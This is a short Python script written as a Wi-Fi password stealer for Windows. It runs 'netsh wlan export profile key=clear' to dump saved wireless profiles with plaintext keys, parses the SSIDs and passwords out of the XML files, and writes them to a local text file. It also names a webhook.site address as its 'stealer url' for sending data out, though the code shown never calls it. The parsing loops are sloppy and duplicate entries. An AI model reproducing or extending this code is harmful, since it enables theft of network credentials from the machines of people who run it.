import subprocess
import os
import sys
import requests

# stealer url
url = 'https://webhook.site/62939172-6189-43ec-9855-4fa841c3c422'

# create a file
password_file = open('password.txt', "w")
password_file.write("Hello sir! Here are your passwords:\n\n")
password_file.close()

# Lists
wifi_files = []
wifi_names = []
wifi_password = []

#  use python to execute a windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output= True).stdout.decode()

#Grab current directory
path = os.getcwd()

# do the hackles
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                            stripped = line.strip()
                            front = stripped[6:]
                            back = front[:-7]
                            wifi_names.append(back)
                    if 'keyMaterial' in line:
                            stripped = line.strip()
                            front = stripped[13:]
                            back = front[:-14]
                            wifi_password.append(back)
                            for x, y in zip(wifi_names, wifi_password):
                                sys.stdout = open("passwords.txt", "a")
                                print("SSID: "+x, "Password: "+y, sep='\n')
                                sys.stdout.close()
        
        
        
        
        
        
        
        
